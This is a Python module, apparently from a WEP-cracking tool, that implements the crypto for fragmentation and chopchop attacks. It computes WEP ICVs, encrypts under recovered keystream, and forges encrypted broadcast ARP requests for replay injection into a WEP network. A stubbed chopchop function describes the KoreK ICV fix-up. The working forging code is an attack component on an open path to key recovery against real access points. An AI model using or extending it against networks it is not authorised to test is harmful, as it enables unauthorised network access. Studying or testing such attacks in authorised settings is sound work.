"""Pure WEP crypto for fragmentation / chopchop (M5/M6).

EVERYTHING HERE IS OFFLINE-TESTABLE — no hardware. This is the trickiest
correctness in M5/M6, so it's built + unit-tested first (the playbook that made
RC4/PTW low-risk). The hardware-in-the-loop part (the oracle: recognizing the
AP's relayed frame) lives in fragmentation.py / chopchop.py.

WEP per-frame layout of the encrypted body (after the 24/26-byte MAC header):
    IV(3) | KeyID(1) | RC4( plaintext ++ ICV )      where ICV = CRC32(plaintext)
The MAC header is cleartext; only plaintext++ICV is RC4'd. Forging needs only
the *keystream* (the IV's RC4 output), never the key — the whole point of
frag/chopchop.

Status: icv / wep_encrypt / forge_arp_request are IMPLEMENTED + tested
(tests/engine/test_wep_crypto.py). chop_last_byte_and_fixup is still a stub —
the KoreK linear-ICV fix-up; do it next with heavy unit tests.
"""

from __future__ import annotations

import struct
import zlib

# LLC/SNAP + ARP-request plaintext prefix (everything up to the variable
# sender/target fields). WEP encrypts this; the bytes are well-known, which is
# what gives frag/chopchop their known-plaintext foothold.
_SNAP_ARP = bytes([0xAA, 0xAA, 0x03, 0x00, 0x00, 0x00, 0x08, 0x06])
_ARP_HDR = bytes([0x00, 0x01, 0x08, 0x00, 0x06, 0x04, 0x00, 0x01])  # eth/ip, req


def icv(plaintext: bytes) -> bytes:
    """4-byte WEP ICV: CRC-32 of plaintext, little-endian. WEP's ICV is the
    standard IEEE CRC-32 (reflected, init/final 0xFFFFFFFF) — i.e. zlib.crc32."""
    return struct.pack("<I", zlib.crc32(plaintext) & 0xFFFFFFFF)


def wep_encrypt(keystream: bytes, plaintext: bytes) -> bytes:
    """Encrypt under a known keystream → the ciphertext *body* (what follows
    IV+KeyID on the wire): (plaintext ++ icv(plaintext)) XOR keystream.
    Needs len(keystream) >= len(plaintext) + 4."""
    blob = plaintext + icv(plaintext)
    if len(keystream) < len(blob):
        raise ValueError(
            f"keystream too short: need {len(blob)} bytes, have {len(keystream)}"
        )
    return bytes(b ^ k for b, k in zip(blob, keystream))


def forge_arp_request(
    keystream: bytes,
    *,
    sender_mac: bytes,
    sender_ip: bytes,
    target_ip: bytes,
) -> bytes:
    """Forge a broadcast ARP-request *encrypted body* from recovered keystream.

    Plaintext = LLC/SNAP ++ ARP-request (36 B), so needs >= 40 B of keystream.
    The caller (campaign) prepends the IV+KeyID this keystream belongs to and a
    ToDS MAC header, then hands it to WepArpReplay. target_mac is all-zero
    (unknown — it's a request)."""
    if len(sender_mac) != 6 or len(sender_ip) != 4 or len(target_ip) != 4:
        raise ValueError("sender_mac must be 6 bytes, IPs 4 bytes each")
    plaintext = (
        _SNAP_ARP + _ARP_HDR + sender_mac + sender_ip + b"\x00" * 6 + target_ip
    )
    return wep_encrypt(keystream, plaintext)


def chop_last_byte_and_fixup(body: bytes, plaintext_guess: int) -> bytes:
    """ChopChop core (STUB — M6): given an encrypted body whose ICV is valid,
    return a one-byte-shorter body whose ICV is ALSO valid IFF ``plaintext_guess``
    equals the true last plaintext byte.

    Relies on CRC32 being linear/affine: removing a byte + correcting the
    trailing ICV is a fixed XOR derived from the guessed byte — no key needed.
    Implement the KoreK fix-up here and unit-test it (decrypt-with-known-
    keystream → CRC valid iff guess correct) before wiring the oracle."""
    raise NotImplementedError("M6 — KoreK ICV fix-up; build with heavy tests")
